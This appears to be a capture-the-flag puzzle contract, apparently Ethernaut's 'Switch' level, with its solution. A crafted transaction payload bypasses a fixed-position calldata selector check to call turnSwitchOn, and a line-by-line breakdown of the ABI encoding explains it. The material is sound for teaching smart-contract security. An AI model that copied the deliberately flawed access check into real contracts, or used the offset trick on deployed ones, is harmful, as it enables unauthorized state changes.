// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
  bool public switchOn; // switch is off
  bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

  modifier onlyThis() {
    require(msg.sender == address(this), "Only the contract can call this");
    _;
  }

  modifier onlyOff() {
    // we use a complex data type to put in memory
    bytes32[1] memory selector;
    // check that the calldata at position 68 (location of _data)
    assembly {
      calldatacopy(selector, 68, 4) // grab function selector from calldata
    }
    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
    _;
  }

  function flipSwitch(bytes memory _data) public onlyOff {
    (bool success, ) = address(this).call(_data);
    require(success, "call failed :(");
  }

  function turnSwitchOn() public onlyThis {
    switchOn = true;
  }

  function turnSwitchOff() public onlyThis {
    switchOn = false;
  }
}


// solution 

await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})


// data explanation
// 0x30c13ade       // function selector
// 0000000000000000000000000000000000000000000000000000000000000060                // offset
// 0000000000000000000000000000000000000000000000000000000000000000                // empty slot
// 20606e1500000000000000000000000000000000000000000000000000000000                // switch of selector (pos68 of calldata)
// 0000000000000000000000000000000000000000000000000000000000000004                // 1ft param length (offset 60 )
// 76227e1200000000000000000000000000000000000000000000000000000000                // 1ft param data (switch on func selector)